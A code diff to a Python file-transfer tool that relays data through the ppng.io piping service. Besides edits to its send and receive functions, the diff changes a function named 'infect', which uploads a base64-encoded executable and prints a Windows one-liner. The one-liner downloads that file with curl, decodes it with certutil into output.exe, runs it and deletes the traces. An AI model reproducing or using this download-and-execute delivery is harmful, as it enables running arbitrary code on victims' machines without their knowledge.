@@ -55,8 +55,16 @@ def send(path, link):
             base64_data = base64.b64encode(f.read()).decode()
         package = f"{path}:{base64_data}"
         os.remove(f"{path}.zip")
-        print(f"Waiting for receiver{Fore.LIGHTBLACK_EX}...{Fore.WHITE}")
-        requests.post(f"https://ppng.io/{link}", data=package)
+        print(f"Waiting for the receiver at {Fore.LIGHTBLACK_EX}:{Fore.WHITE} {link}")
+        
+        r = requests.post(f"https://ppng.io/PipeTransfer:{link}", data=package)
+        if r.status_code == 400:
+            print(f"{Fore.LIGHTBLACK_EX}[{Fore.YELLOW}!{Fore.LIGHTBLACK_EX}]{Fore.WHITE} Someone else is sending on this link.")
+            print(f"{Fore.LIGHTBLACK_EX}[{Fore.MAGENTA}*{Fore.LIGHTBLACK_EX}]{Fore.WHITE} Cutting connection off...")
+            requests.get(f"https://ppng.io/PipeTransfer:{link}")
+            print(f"Waiting for the receiver at {Fore.LIGHTBLACK_EX}:{Fore.WHITE} {link}")
+            requests.post(f"https://ppng.io/PipeTransfer:{link}")
+        
         print(f"Received{Fore.LIGHTBLACK_EX}.")
 
     except FileNotFoundError:
@@ -66,7 +74,7 @@ def send(path, link):
 
 
 def receive(link):
-    response = requests.get(f"https://ppng.io/{link}", stream=True)
+    response = requests.get(f"https://ppng.io/PipeTransfer:{link}", stream=True)
     total_size = int(response.headers.get("content-length", 0))
     with tqdm(total=total_size, unit="B", unit_scale=True, desc="Downloading") as pbar:
         with open("temp.yes", "wb") as file:
@@ -104,10 +112,10 @@ def infect(path, link):
                 base64_data = base64.b64encode(f.read()).decode()
             print(f"{Fore.WHITE}Generating Command{Fore.LIGHTBLACK_EX}...\n")
             print(
-                f"{Fore.WHITE}curl -o temp.txt https://ppng.io/{link} & certutil -decode temp.txt output.exe & output.exe & del temp.txt\n"
+                f"{Fore.WHITE}curl -o temp.txt https://ppng.io/PipeTransfer:{link} & certutil -decode temp.txt output.exe & output.exe & del temp.txt\n"
             )
             print(f"Waiting for receivers{Fore.LIGHTBLACK_EX}...")
-            requests.post(f"https://ppng.io/{link}", data=base64_data)
+            requests.post(f"https://ppng.io/PipeTransfer:{link}", data=base64_data)
             print(f"{Fore.GREEN}Received{Fore.LIGHTBLACK_EX}.")
 
         except FileNotFoundError:
